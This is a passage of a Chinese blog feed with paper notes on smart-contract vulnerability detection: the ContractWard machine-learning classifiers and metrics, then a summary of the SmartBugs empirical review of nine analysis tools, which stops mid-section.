（OvR） 策略，这是最经典的拆分策略之一，用于实现多标签分类。</p><ul><li>OvR 的主要思想是训练六个二进制分类器，条件是将一个类别视为阳性类，将其他类别视为阴性类。在训练过程中，如果样本在六个类别中的一些类别中预测为阳性，则相应的标签为 1，这意味着样本在这些类别中具有漏洞。</li></ul><p>每个二进制分类任务都采用<a href="https://easyai.tech/ai-definition/ensemble-learning/">集成学习算法</a>（Ensemble learning algorithms），以获得比单个学习者更好的泛化性能（generalization performance）。为了便于比较，还采用了单一学习算法（single learning algorithms）。集成学习算法通过组合多个基分类器来完成学习任务，我们在此工作中使用决策树 （Decision Tree，DT）。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015155100.png" alt="img"></p><center>集成学习分类器</center><p>集成学习会挑选一些简单的基础模型进行组装，组装这些基础模型的思路主要有 2 种方法：</p><ol><li><p>bagging（bootstrap aggregating的缩写，也称作“套袋法”）；Bagging 的核心思路是——民主。Bagging 的思路是所有基础模型都一致对待，每个基础模型手里都只有一票。然后使用民主投票的方式得到最终的结果。大部分情况下，经过 bagging 得到的结果方差（variance）更小。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015155311.png" alt="bagging的具体过程"></p></li><li><p>boosting：增强。Boosting 的核心思路是——挑选精英。Boosting 和 bagging 最本质的差别在于他对基础模型不是一致对待的，而是经过不停的考验和筛选来挑选出「精英」，然后给精英更多的投票权，表现不好的基础模型则给较少的投票权，然后综合所有人的投票得到最终结果。经过 boosting 得到的结果偏差（bias）更小。</p><p><img src="https://easy-ai.oss-cn-shanghai.aliyuncs.com/2019-10-17-boosting.png" alt="boosting的具体过程"></p></li></ol><p>基于训练集的特征空间和标签，采用 eXtreme Gradient Boosting（XGBoost） 来开发 ContractWard 来检测智能合约中的漏洞。我们还采用自适应增强 （adopt Adaptive Boosting，AdaBoost）、随机森林 （Random Forest，RF）、支持矢量机 （Support Vector Machine，SVM） 和 k-最近邻居 （k-Nearest Neighbor，KNN） 进行检测以进行比较。</p><p>eXtreme Gradient Boosting （XGBoost）： XGBoost 是一种高效的Boosting 算法。为了实现快速拟合，the learner应尽量减少预测值与实际值（例如：残差）之间的差值，并形成正则损耗函数（regularized loss function）。最后，预测是所有learner的总和。XGBoost 利用类似于 RF 的列采样来减少方差。与 AdaBoost 相比，XGBoost 效率很高，因为它支持功能粒度的并行处理，而不是学习粒度（learner granularity）的并行处理。</p><p>Adaptive Boosting（AdaBoost）：AdaBoost 是增强算法的代表。它开始建立其第一个learner与初始训练集。在重新加权（re-weighting）过程中，它增加了正确分类或预测的样本的权重，同时同时减少错误分类和预测的样本的权重。重新分配样本的权重后，进行下一次训练。重复数次，直到基本学习器的数量达到预先设置的值。最后，通过结合多个弱学习器，可以获得强大的学习器。经过每个弱分类器的训练过程，增加了分类误差率小的弱分类器的权重，使其在最终分类函数中起着更大的决定性作用。相比之下，分类误差率较大的弱分类器的权重减小，在最终分类函数中起着较小的决定性作用。</p><p>Random Forest （RF）： RF 是Bagging algorithms的扩展变体。训练集由 n 个示例组成，使用随机采样算法替换到从数据集中采样 n 次，反复，直到获得 t 个训练集数。然后分别对 t 基础学习器进行训练。其次，在预测过程中，分类决定取决于多数票。随机属性选择用于训练过程。</p><p>支持向量机（SVM）：SVM是广泛使用的分类方法。其目标是找到一个超平面（hyper-plane），将样本分割成正样本或负样本，因此这两个类别之间有最大裕量（margin），其中分类器具有高可靠性和良好泛化能力的新样本。</p><p>k-最近邻居（KNN）：KNN也是非常广泛使用的分类算法。它简单而高效。 给定一个测试样本，根据一些距离测量值找到最接近样本的 k 训练样本，然后根据 k 邻居的信息获得预测。根据多数票，k 样本中最常见的类别标签被选为预测结果。</p><h3 id="Model-Selection"><a href="#Model-Selection" class="headerlink" title="Model Selection"></a>Model Selection</h3><p>同一学习算法的超参数的分类结果差异很大。超参数是在学习之前设置其值的参数，而不是可以通过训练获得的参数。因此，在模型选择中，应调整算法的超参数，这通常称为超参数调优。 模型经过预设置的超参数训练，然后通过参数调整获得最优模型的超参数。 此外，决策阈值也根据数据分布进行调整，称为阈值移动。通常，如果预测值超过阈值，默认值为 0.5，则样本被区分为正数，或者相反为负值。通过上述方法，在培训过程中可以很好地避免分类器中过度安装和不拟合的问题。在我们的工作中，我们在培训处理中不采用 n 倍交叉验证（n-fold cross-validation）。</p><h2 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h2><p>在本节中，我们对测试集进行综合实验，以实现三重目标。首先，将采样方法与五个分类器进行比较，以验证采样方法的必要性。其次，F1-score, Micro-F1 值 ，Macro-F1值来衡量分类器的性能。根据评估结果，使用 XGBoost 分类器在合同中使用 SMOTETomek 在平衡训练集上训练。最后对合同的分类结果进行详细分析。</p><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>实验环境：</p><center>TABLE V THE EXPERIMENT ENVIRONMENT</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015161418.png" alt="image-20201015161418816"></p><h3 id="Test-Sets"><a href="#Test-Sets" class="headerlink" title="Test Sets"></a>Test Sets</h3><p>在实验中，70% 的数据集用作训练数据。如果剩余的 30% 直接用作测试数据，则分类结果在不平衡的测试集上可能不够好。 如前所述，为了平衡测试集，我们采用随机抽样方法从大约 15K 个实际智能合约中选择样本。对于四种类型的漏洞，即 TOD、Callstack 漏洞、Timestamp 漏洞和Reentrancy漏洞，我们从多数类中随机选择样本，并且从多数类中选择的样本数是少数类数的五倍。然后，我们将从多数类和少数类的所有样本中选择的样本组合在一起，以形成最终包含足够样本且没有虚构样本的测试集。</p><h3 id="评估指标"><a href="#评估指标" class="headerlink" title="评估指标"></a>评估指标</h3><h4 id="F1-score"><a href="#F1-score" class="headerlink" title="F1 score"></a>F1 score</h4><p>F1 score是用来评价二元分类器的度量，它的计算方法如下：</p><ol><li>首先定义以下几个概念<ol><li>$TP$（True Positive）真阳性：预测为正，实际也为正</li><li>$FP$（False Positive）假阳性：预测为正，实际为负</li><li>$FN$（False Negative）假阴性：预测与负、实际为正</li><li>$TN$（True Negative）真阴性：预测为负、实际也为负</li></ol></li><li>通过第一步的统计值计算precision和recall<ol><li>精准度 / 查准率($precision=\frac{TP}{TP+FP}$)：指被分类器判定阳性例中的阳性样本的比重</li><li>召回率 / 查全率 ($recall=\frac{TP}{TP+FN}$)：指的是被预测为阳性例的占总的阳性例的比重</li><li>准确率($accuracy=\frac{TP+TN}{TP+FN+TN+FP}$)：代表分类器对整个样本判断正确的比重</li></ol></li><li>$F1_{i}= \frac{2}{ \frac {1} {precision}+\frac {1} {recall}} =2\times \frac{precision \times recall}{precision+recall}$</li></ol><p>F1是用来衡量二维分类的，Micro-F1 score和Macro-F1 score则是用来衡量多元分类器的性能。</p><h4 id="Macro-F1-score"><a href="#Macro-F1-score" class="headerlink" title="Macro-F1 score"></a>Macro-F1 score</h4><p>对于一个多分类问题，$TP_i$ 、$FP_i$、$TN_i$、$FN_i$、分别是分类$i$的True Positive、False Positive、True Negative、False Negative。</p><ol><li>分别计算每个类的精度(precision)和召回率（recall）<ol><li>每个类的精度(precision)：$precision_i=\frac{TP_i}{TP_i+FP_i}$)</li><li>每个类的召回率（recall）：$recall_i=\frac{TP_i}{TP_i+FN_i}$</li></ol></li><li>计算Macro-F1 score的精度和召回率是所有分类的平均值<ol><li>Macro-P 精度：$ Precision_{macro}=\frac{1}{n}\sum_{i=i}^{n}precision_i$</li><li>Macro-R 召回：$ Recall_{macro}=\frac{1}{n}\sum_{i=i}^{n}recall_i$</li></ol></li><li>套用F1score的计算方法，Macro-F1 score就是：<ol><li>$Macro-F1 score=2 \times \frac{Rrecision_{macro} \times Recall_{macro}}{Precision_{macro}+Recall_{macro}}$</li></ol></li></ol><p>Micro-F1 score</p><ol><li>通过的统计值计算的Micro-F1 score的precision和recall<ol><li>Micro-P 精度：$ Precision_{micro}=\frac{\sum_{i=i}^{n}TP_i}{\sum_{i=i}^{n}TP_i+\sum_{i=i}^{n}FP_i}$</li><li>Micro-R 召回：$ Recall_{micro}=\frac{\sum_{i=i}^{n}TP_i}{\sum_{i=i}^{n}TP_i+\sum_{i=i}^{n}FN_i}$</li></ol></li><li>Micro-F1 score就是<ol><li>$Micro-F1 score=2 \times \frac{Rrecision_{micro} \times Recall_{micro}}{Precision_{micro}+Recall_{micro}}$</li></ol></li></ol><h3 id="Sampling-Methods"><a href="#Sampling-Methods" class="headerlink" title="Sampling Methods"></a>Sampling Methods</h3><p>评估我们关于真实世界智能合约的方法。 我们在同一测试集上使用五个分类器，即 XGBoost 分类器、AdaBoost 分类器、RF 分类器、SVM 分类器和 KNN 分类器，每个分类器由三个不同的训练集进行训练，即原始训练集、与 SMOTE 平衡的训练集以及与 SMOTETomek 平衡的训练集，如表四所示。我们选择Micro-F1和Macro-F1 作为分类评估指标。Micro-F1和Macro-F1  是用于评估多标签分类的度量。</p><ul><li>计算 Micro-F1 时，该值易受具有许多样本的类别的分类结果的影响。</li><li>计算 Macro-F1 时，无论每个类别中的样本数如何，每个类别的权重都是相等的。</li></ul><p>图 4 表明，每个分类器的预测 Micro-F1 和Macro-F1 值与在训练集上训练的与 SMOTE 平衡或与 SMOTETomek 平衡的训练集上的值大于在原始训练集上训练的每个分类器的值。更具体地说，SMOTETomek 在五个分类器中比 SMOTE 效率更高，以平衡数据，而 Micro-F1 和 Macro-F1 在 XGBoost 分类器中都可以达到 96% 以上。因此，SMOTE和SMOTETomek方法可以成功地解决分类器由于类不平衡而导致的泛化能力薄弱的问题。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015165334.png" alt="image-20201015165334234"></p><center>Fig. 4. The Comparison of Sampling Methods with Five Classifiers</center><h3 id="Classifiers"><a href="#Classifiers" class="headerlink" title="Classifiers"></a>Classifiers</h3><p>进行综合实验，目的是比较基于五个多标签分类器的性能，即XGBoost分类器、AdaBoost分类器、RF分类器、SVM 分类器和 KNN 分类器，以及两种采样方法，即 SMOTE 和 SMTOETomek。Micro-F1 和Macro-F1 用于测量分类器的性能。F1-score 是用于评估二进制分类器的度量值，它被定义为召回 （R） 和精度 （P） 的加权平均值（weighted harmonic mean）。</p><p>在表 VI 中，可以看到 XGBoost 分类器产生的 F1 得分值比每个二进制分类任务中的 AdaBoost 分类器、RF 分类器、SVM 分类器和 KNN 分类器高。XGBoost多标签分类器的预测微Micro-F1 和Macro-F1 在五个分类器中最高，达到96%以上。</p><center>TABLE VI THE DETECTION PERFORMANCE COMPARISON OF FIVE CLASSIFIERS TRAINED BY TRAINING SETS BALANCED WITH SMOTETOMEK</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015165847.png" alt="image-20201015165847495"></p><p>在我们的多标签分类中，集成式学习分类器的表现优于 SVM 和 KNN 分类器。Micro-F1 值大于 Macro-F1 值，因为溢出和下溢漏洞的测试样本数量都很大，并且这两个类别的 F1 得分值很高。比较表六和表七，很明显，XGBoost分类器的性能与SMOTETomek平衡训练，性能好于预期。因此，我们在名为”合同”的模型中将 XGBoost 分类器与 SMOTETomek 方法一起选择。</p><center>TABLE VII THE DETECTION PERFORMANCE COMPARISON OF FIVE CLASSIFIERS TRAINED BY TRAINING SETS BALANCED WITH SMOTE</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015165913.png" alt="image-20201015165913769"></p><h3 id="ContractWard"><a href="#ContractWard" class="headerlink" title="ContractWard"></a>ContractWard</h3><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015170214.png" alt="image-20201015170214299"></p><center>Fig. 5. The ROC Curves of ContractWard with XGBoost classifier.</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201015170413.png" alt="image-20201015170412926"></p><center>Fig. 6. TPRs, FNRs, TNRs and FPRs of ContractWard</center><h2 id="总结结论"><a href="#总结结论" class="headerlink" title="总结结论"></a>总结结论</h2><p>本文选取Oyente作为基准方法，从以往几篇文章来看，这种方法在检测准确度上并不是十分地好，还有更多表现更加优良的方法，如Mythril、Slither等。所以在基准的选取上可能并不是那么得有说服力。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empirical Review of Automated Analysis Tools on 47,587 Ethereum Smart Contracts</title>
    <link href="/2020/10468b6a58.html"/>
    <url>/2020/10468b6a58.html</url>
    
    <content type="html"><![CDATA[<h1 id="Empirical-Review-of-Automated-Analysis-Tools-on-47-587-Ethereum-Smart-Contracts"><a href="#Empirical-Review-of-Automated-Analysis-Tools-on-47-587-Ethereum-Smart-Contracts" class="headerlink" title="Empirical Review of Automated Analysis Tools on 47,587 Ethereum Smart Contracts"></a>Empirical Review of Automated Analysis Tools on 47,587 Ethereum Smart Contracts</h1><p>论文题目：(2020-ICSE) <a href="https://dl.acm.org/doi/abs/10.1145/3377811.3380364">Empirical Review of Automated Analysis Tools on 47,587 Ethereum Smart Contracts</a> —— 自动分析工具对47,587个以太坊智能合约的进行实证评估</p><p>论文引用：Durieux T, Ferreira J F, Abreu R, et al. Empirical review of automated analysis tools on 47,587 Ethereum smart contracts[C]//Proceedings of the ACM/IEEE 42nd International Conference on Software Engineering. 2020: 530-541.</p><p>代码开源：<a href="https://github.com/smartbugs/smartbugs">SmartBugs</a></p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412114935.png" alt="image-20210412114934942"></p><h2 id="一、MAIN-CONTENT"><a href="#一、MAIN-CONTENT" class="headerlink" title="一、MAIN CONTENT"></a>一、MAIN CONTENT</h2><p>本文想要分析当前最新检测智能合约漏洞工具的有效性和实用性，选择了35种主流的自动分析工具，按照自定义的四个标准筛选出了9个不同的工具；为了能够执行和比较自动分析工具，从而为公平比较奠定基础，作者提供了两个Solidity智能合约数据集：</p><ul><li>第一个数据集包含69个手动注释的智能合约，可用于评估分析工具的精度。</li><li>第二个数据集包含以太坊区块链中所有可用的智能合约，这些合约在撰写本文时在Etherscan上具有Solidity源代码（总共47,518个合约）</li></ul><p>并且已经在两个数据集上执行了9种最新的自动化分析工具，并对结果进行了分析，所有工具的执行需要564天3小时才能完成428,337分析。为了简化对智能合约自动分析技术的研究，提供了一个新颖的，可扩展的，易于使用的执行框架，称为SmartBugs，可以在相同的执行环境中执行这些工具；该框架当前包含9个已配置的智能合约分析工具。</p><p>结果表明，所有工具仅检测到注释数据集中的漏洞的42％，并且最新技术无法检测DASP10的两类漏洞：随机性差（Bad Randomness）和短地址（Short Addresses）；其中<a href="https://github.com/ConsenSys/mythril">Mythtil</a>具有更高的准确性（27％），此外本文还提到如果要兼顾准确性和执行成本，那么Mythril和Slither的组合可以检测到总共42/115（37％）的漏洞，这是最佳折衷方案；</p><p>而对另一个数据集进行漏洞检测时，有97％的合同至少被一种工具检测到漏洞，这表明每种工具都可能存在着大量误报，而其中Oyente更是当仁不让地检测到73％的合同中的漏洞。总之表明，最先进的技术远非完美无缺，依然有很大改进的空间。</p><p>总而言之，本文的贡献是：</p><p>（1）带有注释的易受攻击的Solidity智能合约数据集；<br>（2）一个包含以太坊区块链（Etherscan）中所有可用的智能合约的数据集，并且合约具有Solidity源代码;<br>（3）一个执行框架SmartBugs，包括9个预配置的智能合约分析工具；<br>（4）对47,587份智能合约执行9种工具的分析。</p><h2 id="二、BACKGROUND"><a href="#二、BACKGROUND" class="headerlink" title="二、BACKGROUND"></a>二、BACKGROUND</h2><p>研究者已经开发了一些自动分析工具，以查找和消除智能合约中的漏洞。但是，比较和复制这项研究并不容易：即使有几种工具是公开可用的，但使用的数据集却不是。如果新工具的开发人员想将新工具与现有工作进行比较，当前的方法是与替代工具的作者联系，并希望他们能够访问其数据集。</p><h2 id="三、STUDY-DESIGN"><a href="#三、STUDY-DESIGN" class="headerlink" title="三、STUDY DESIGN"></a>三、STUDY DESIGN</h2><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412115007.png" alt="image-20210412115007168"></p><h3 id="Research-Questions"><a href="#Research-Questions" class="headerlink" title="Research Questions"></a>Research Questions</h3><ol><li><p>[Effectiveness] What is the effectiveness of current analysis tools in detecting vulnerabilities in Solidity smart contracts?</p><p>探究最新的分析工具在检测已知智能合约中的漏洞方面的精确度如何</p></li><li><p>[Production] How many vulnerabilities are present in the Ethereum blockchain?</p><p>调查了从以太坊区块链中提取的合约中检测到的漏洞，考虑了最流行的漏洞，随时间的演变的漏洞以及自动分析工具的不同组合之间的共同漏洞。</p></li><li><p>[Performance] How long do the tools require to analyze the smart contracts?</p><p>比较分析工具的性能。目的是确定哪种工具效率最好</p></li></ol><h3 id="Subject-Tools"><a href="#Subject-Tools" class="headerlink" title="Subject Tools"></a>Subject Tools</h3><p>根据一些已有的文献和作者自己的搜查，列出了35种工具：</p><center>TABLE 1 确定为该研究潜在的工具</center><table><thead><tr><th>#</th><th>Tools</th><th>URLs</th></tr></thead><tbody><tr><td>1</td><td>contractLarva</td><td><a href="https://github.com/gordonpace/contractLarva">https://github.com/gordonpace/contractLarva</a></td></tr><tr><td>2</td><td>E-EVM</td><td><a href="https://github.com/pisocrob/E-EVM">https://github.com/pisocrob/E-EVM</a></td></tr><tr><td>3</td><td>Echidna</td><td><a href="https://github.com/crytic/echidna">https://github.com/crytic/echidna</a></td></tr><tr><td>4</td><td>Erays</td><td><a href="https://github.com/teamnsrg/erays">https://github.com/teamnsrg/erays</a></td></tr><tr><td>5</td><td>Ether</td><td>N/A</td></tr><tr><td>6</td><td>Ethersplay</td><td><a href="https://github.com/crytic/ethersplay">https://github.com/crytic/ethersplay</a></td></tr><tr><td>7</td><td>EtherTrust</td><td><a href="https://www.netidee.at/ethertrust">https://www.netidee.at/ethertrust</a></td></tr><tr><td>8</td><td>EthIR</td><td><a href="https://github.com/costa-group/EthIR">https://github.com/costa-group/EthIR</a></td></tr><tr><td>9</td><td>FSolidM</td><td><a href="https://github.com/anmavrid/smart-contracts">https://github.com/anmavrid/smart-contracts</a></td></tr><tr><td>10</td><td>Gasper</td><td>N/A</td></tr><tr><td>11</td><td>==HoneyBadger==</td><td><a href="https://github.com/christoftorres/HoneyBadger">https://github.com/christoftorres/HoneyBadger</a></td></tr><tr><td>12</td><td>KEVM</td><td><a href="https://github.com/kframework/evmsemantics">https://github.com/kframework/evmsemantics</a></td></tr><tr><td>13</td><td>MadMax</td><td><a href="https://github.com/nevillegrech/MadMax">https://github.com/nevillegrech/MadMax</a></td></tr><tr><td>14</td><td>Maian</td><td><a href="https://github.com/MAIAN-tool/MAIAN">https://github.com/MAIAN-tool/MAIAN</a></td></tr><tr><td>15</td><td>==Manticore==</td><td><a href="https://github.com/trailofbits/manticore/">https://github.com/trailofbits/manticore/</a></td></tr><tr><td>16</td><td>==Mythril==</td><td><a href="https://github.com/ConsenSys/mythril-classic">https://github.com/ConsenSys/mythril-classic</a></td></tr><tr><td>17</td><td>Octopus</td><td><a href="https://github.com/quoscient/octopus">https://github.com/quoscient/octopus</a></td></tr><tr><td>18</td><td>==Osiris==</td><td><a href="https://github.com/christoftorres/Osiris">https://github.com/christoftorres/Osiris</a></td></tr><tr><td>19</td><td>==Oyente==</td><td><a href="https://github.com/melonproject/oyente">https://github.com/melonproject/oyente</a></td></tr><tr><td>20</td><td>Porosity</td><td><a href="https://github.com/comaeio/porosity">https://github.com/comaeio/porosity</a></td></tr><tr><td>21</td><td>rattle</td><td><a href="https://github.com/crytic/rattle">https://github.com/crytic/rattle</a></td></tr><tr><td>22</td><td>ReGuard</td><td>N/A</td></tr><tr><td>23</td><td>Remix</td><td><a href="https://github.com/ethereum/remix">https://github.com/ethereum/remix</a></td></tr><tr><td>24</td><td>SASC</td><td>N/A</td></tr><tr><td>25</td><td>sCompile</td><td>N/A</td></tr><tr><td>26</td><td>==Securify==</td><td><a href="https://github.com/eth-sri/securify">https://github.com/eth-sri/securify</a></td></tr><tr><td>27</td><td>==Slither==</td><td><a href="https://github.com/crytic/slither">https://github.com/crytic/slither</a></td></tr><tr><td>28</td><td>==Smartcheck==</td><td><a href="https://github.com/smartdec/smartcheck">https://github.com/smartdec/smartcheck</a></td></tr><tr><td>29</td><td>Solgraph</td><td><a href="https://github.com/raineorshine/solgraph">https://github.com/raineorshine/solgraph</a></td></tr><tr><td>30</td><td>Solhint</td><td><a href="https://github.com/protofire/solhint">https://github.com/protofire/solhint</a></td></tr><tr><td>31</td><td>SolMet</td><td><a href="https://github.com/chicxurug/SolMet-Solidity-parser">https://github.com/chicxurug/SolMet-Solidity-parser</a></td></tr><tr><td>32</td><td>teEther</td><td><a href="https://github.com/nescio007/teether">https://github.com/nescio007/teether</a></td></tr><tr><td>33</td><td>Vandal</td><td><a href="https://github.com/usyd-blockchain/vandal">https://github.com/usyd-blockchain/vandal</a></td></tr><tr><td>34</td><td>VeriSol</td><td><a href="https://github.com/microsoft/verisol">https://github.com/microsoft/verisol</a></td></tr><tr><td>35</td><td>Zeus</td><td>N/A</td></tr></tbody></table><p>其中只有满足四个纳入条件（inclusion criteria）的工具才会被应用到最后的研究。三个纳入条件如下：</p><ol><li>Available and CLI：该工具是公开可用的，并支持命令行界面（command-line interface，CLI）；CLI促进了分析的可伸缩性</li><li>Compatible Input：该工具将Solidity合同作为输入。这不包括仅考虑仅以EVM字节码为输入的工具。</li><li>Only Source：该工具仅需要合同的源代码即可运行分析。这不包括需要测试套件（test suite）或带有断言注释的合同（contracts annotated with assertions）的工具。</li><li>Vulnerability Finding：该工具可以识别智能合约中的漏洞或不良实践（bad practices）。这排除了仅构造诸如控制流程图之类的工件的分析类工具（analysis tools）</li></ol><p>在检查了表1中列出的所有35种分析工具之后，发现有9种工具符合概述的纳入标准。表2列出了排除和包含的工具，对于排除的工具，还显示了它们不符合哪些标准。</p><center>TABLE 2 根据作者的纳入标准排除和包含的分析工具</center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009161527.png" alt="image-20201009161520383"></p><h4 id="HoneyBadger"><a href="#HoneyBadger" class="headerlink" title="HoneyBadger"></a>HoneyBadger</h4><p>由卢森堡大学的一组研究人员开发，是基于Oyente的工具，该工具采用符号执行和一组启发式方法（a set of heuristics）来确定智能合约中的漏洞（honeypots，这里用了蜜罐指代）。honeypots是指在设计上似乎有明显的缺陷的智能合约，假设用户先验将一定数量的以太币转移到合约中，则任意用户都可以从合约中消耗Ether。当HoneyBadger检测到合同似乎易受攻击时，这意味着合同的开发人员希望使合同看起来易受攻击，但并不易受攻击。</p><h4 id="Maian"><a href="#Maian" class="headerlink" title="Maian"></a>Maian</h4><p>由新加坡国立大学和伦敦大学学院的研究人员联合开发的，也是基于Oyente工具的。Maian会寻找可以自毁（self-destructed）合同、从任意地址抽取以太的合同，以及不具有付款功能的却接受以太的合同；然后使用私有区块链中的动态分析（dynamic analysis）来减少误报的数量。</p><h4 id="Manticore"><a href="#Manticore" class="headerlink" title="Manticore"></a>Manticore</h4><p>由TrailOfBits开发，使用符号执行在EVM字节码中搜索引起重入（reentrancy）漏洞和可达到自毁（reachable self-destruct）执行路径的漏洞。</p><h4 id="Mythril"><a href="#Mythril" class="headerlink" title="Mythril"></a>Mythril</h4><p>由ConsenSys开发的产品，依赖于EVM字节码的调和分析（concolic analysis），污点分析（taint analysis）和控制流检查（control flow checking），以修剪搜索空间并查找可以利用智能合约中的漏洞的价值。</p><h4 id="Osiris"><a href="#Osiris" class="headerlink" title="Osiris"></a>Osiris</h4><p>由卢森堡大学的一组研究人员开发的Oyente扩展了功能，可以检测智能合约中的整数错误（integer bugs）。</p><h4 id="Oyente"><a href="#Oyente" class="headerlink" title="Oyente"></a>Oyente</h4><p>由Melonport AG开发的，是最早的智能合约分析工具之一。它也被用作Maian和Osiris等其他几种方法的基础。 Oyente在EVM字节码上使用符号执行来识别漏洞。</p><h4 id="Securify"><a href="#Securify" class="headerlink" title="Securify"></a>Securify</h4><p>由苏黎世联邦理工学院的ICE中心开发，使用Souffle Datalog求解器静态分析EVM字节码，以推断出与合同有关的精确语义信息。然后，它将检查合规性（compliance）和违规（violation）模式，以捕获足够的条件来证明财产是否成立。</p><h4 id="Slither"><a href="#Slither" class="headerlink" title="Slither"></a>Slither</h4><p>由TrailOfBits开发的是一种静态分析框架，该框架将Solidity智能合约转换为称为SlithIR的中间表示形式，并应用已知的程序分析技术，例如数据流和污点跟踪（taint tracking），来提取和改进信息。</p><h4 id="Smartcheck"><a href="#Smartcheck" class="headerlink" title="Smartcheck"></a>Smartcheck</h4><p>由SmartDec开发的是一种静态分析工具，用于查找漏洞模式和不良的编程行为（bad coding practices）；它在Solidity源代码上运行词法和句法分析（lexical and syntactical analysis）。</p><h3 id="Datasets-of-Smart-Contracts"><a href="#Datasets-of-Smart-Contracts" class="headerlink" title="Datasets of Smart Contracts"></a>Datasets of Smart Contracts</h3><h4 id="A-Dataset-of-69-Vulnerable-Smart-Contracts"><a href="#A-Dataset-of-69-Vulnerable-Smart-Contracts" class="headerlink" title="A Dataset of 69 Vulnerable Smart Contracts"></a>A Dataset of 69 Vulnerable Smart Contracts</h4><p>$SB^{curated}$，包含69个易受攻击的智能合约：此数据集中的合同或者是已被识别为易受攻击的真实合同，或者是为了说明易受攻击性而故意创建的。该数据集的目标是拥有一组标记有漏洞的位置和类别的已知漏洞合同。此数据集可用于评估智能合约分析工具识别漏洞的有效性。</p><p>用$DASP^3$中提供的分类法来描述以太坊智能合约的漏洞。每个收集的合同都归为十类之一。通过从三个不同的来源收集合同来创建此数据集：</p><ol><li>GitHub存储库；</li><li>分析合同的博客文章；</li><li>以太坊网络。 </li></ol><p>其中80％的合同是从GitHub存储库中收集的。每行包含一个漏洞类别。对于每个类别都提供一个描述(Description)、可以减轻攻击的级别（Level）、该类别中可用的合同数量（Contracts）以及该类别的合同中的代码行总数（lines of code，LOC）。</p><center>TABLE 3 数据集中可用漏洞的类别</center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009193624.png" alt="image-20201009193623965"></p><p>作者提供获取合同的URL及其作者来确保每个合同的可追溯性；数据集包含69个合约和115个带标签的漏洞，分为十类漏洞。并且将此数据集开源在<a href="https://smartbugs.github.io/">SmartBugs</a>。</p><h4 id="47-518-Contracts-from-the-Ethereum-Blockchain"><a href="#47-518-Contracts-from-the-Ethereum-Blockchain" class="headerlink" title="47,518 Contracts from the Ethereum Blockchain"></a>47,518 Contracts from the Ethereum Blockchain</h4><p>$SB^{WILD}$，包含从以太坊区块链中提取的47,518个合约：这些合同的漏洞集是未知的；但是，该数据集可用于识别具有（潜在）漏洞并指示特定问题发生频率的真实合同。它也可以用于比较诸如性能等指标的分析工具。</p><center>TABLE 4 从以太坊区块链收集Solidity智能合约的统计数据。</center><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20201009194431.png" alt="image-20201009194431486"></p><p>该数据集可在GitHub 上获得。数据集包含47,518个合约中每个合约的Solidity源代码。合同以合同地址命名；还为该数据集附加了其他信息，以便将该数据集用于其他类型的研究。它包含：</p><ul><li>合同名称； </li><li>已用于编译合同的Solidity版本； </li><li>重复合同的地址； </li><li>与合同相关的交易数量； </li><li>以Solidity代码行为单位的合同大小； </li><li>2,263,096个合同的最后交易日期； </li><li>2,263,096个合同的创建日期； </li><li>972,975个有可用源代码的以太坊余额的合约。</li></ul><h3 id="The-Execution-Framework：SmartBugs"><a href="#The-Execution-Framework：SmartBugs" class="headerlink" title="The Execution Framework：SmartBugs"></a>The Execution Framework：SmartBugs</h3><p>SmartBugs，这是一个执行框架，旨在简化智能合约数据集上分析工具的执行。<br>SmartBugs具有以下功能：</p><ul><li>一个插件系统，可基于Docker映像轻松添加新的分析工具； </li><li>并行执行工具以加快执行时间； </li><li>一种输出机制，可标准化工具输出结果的方式，并简化跨工具的输出过程。</li></ul><h4 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h4><p>SmartBugs由五个主要部分组成：</p><ol><li>第一个由使用SmartBug的命令行界面组成。 </li><li>第二部分包含工具插件。每个工具插件均包含工具的配置。该配置包含Docker映像的名称，工具的名称，运行该工具的命令行，该工具的描述以及结果输出的位置。 </li><li>存储在Docker Hub上的Docker映像。当已有Docker映像时，将使用工具的Docker映像；否则，将创建自己的映像（所有Docker映像（包括作者的）都可以在Docker Hub上公开获得）。 </li><li>智能合约的数据集。 </li><li>SmartBugs的运行程序将SmartBugs的所有部分放在一起，以执行智能合约上的分析工具。</li></ol><h4 id="Dataset-Interface-Details"><a href="#Dataset-Interface-Details" class="headerlink" title="Dataset Interface Details"></a>Dataset Interface Details</h4><p>数据集接口详细信息：SmartBugs提供了一个命令行界面，可简化智能合约分析工具的执行。它需要一套工具名称和一个Solidity文件的路径来进行分析，并在每次执行时生成两个文件：</p><ol><li>包含执行标准输出的result.log文件</li><li>包含执行结果的result.json文件，以可解析的格式进行分析。我们提供了处理这些输出的脚本，并将它们呈现在可读的表中。</li></ol><h3 id="Data-Collection-and-Analysis"><a href="#Data-Collection-and-Analysis" class="headerlink" title="Data Collection and Analysis"></a>Data Collection and Analysis</h3><p>使用SmartBugs在两个数据集上执行了9种工具，收集了输出并用于进一步分析。</p><h4 id="Tools’-Setup"><a href="#Tools’-Setup" class="headerlink" title="Tools’ Setup"></a>Tools’ 